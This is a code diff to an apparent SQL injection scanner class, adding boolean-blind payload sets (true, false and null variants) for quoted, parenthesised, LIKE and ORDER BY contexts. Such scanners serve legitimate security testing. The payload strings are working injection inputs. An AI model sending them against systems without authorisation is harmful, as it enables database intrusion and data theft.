@@ -88,13 +88,43 @@ export class TernaryMetamorphicVerifier {
       append: true,
     });
 
-    // 4. Double-Quote String context
+    // 4. Double-Parenthesized Single-Quote context
+    tuples.push({
+      context: 'double_parenthesized_single_quote',
+      prefix: "'))",
+      truePayload: `')) AND (('1'='1${comment}`,
+      falsePayload: `')) AND (('1'='2${comment}`,
+      nullPayload: `')) AND (NULL IS NULL)${comment}`,
+      append: true,
+    });
+
+    // 5. Double-Quote String context
     tuples.push({
       context: 'double_quote_and',
       prefix: '"',
       truePayload: `" AND "1"="1${comment}`,
       falsePayload: `" AND "1"="2${comment}`,
       nullPayload: `" AND (NULL IS NULL)${comment}`,
+      append: true,
+    });
+
+    // 6. LIKE Pattern context
+    tuples.push({
+      context: 'like_clause',
+      prefix: "%'",
+      truePayload: `%' AND '1'='1' AND '%'='${comment}`,
+      falsePayload: `%' AND '1'='2' AND '%'='${comment}`,
+      nullPayload: `%' AND (NULL IS NULL) AND '%'='${comment}`,
+      append: true,
+    });
+
+    // 7. ORDER BY / Conditional Expression context
+    tuples.push({
+      context: 'order_by_conditional',
+      prefix: '',
+      truePayload: `,(CASE WHEN (1=1) THEN 1 ELSE 2 END)`,
+      falsePayload: `,(CASE WHEN (1=2) THEN 1 ELSE 2 END)`,
+      nullPayload: `,(CASE WHEN (NULL IS NULL) THEN 1 ELSE 2 END)`,
       append: true,
     });
 
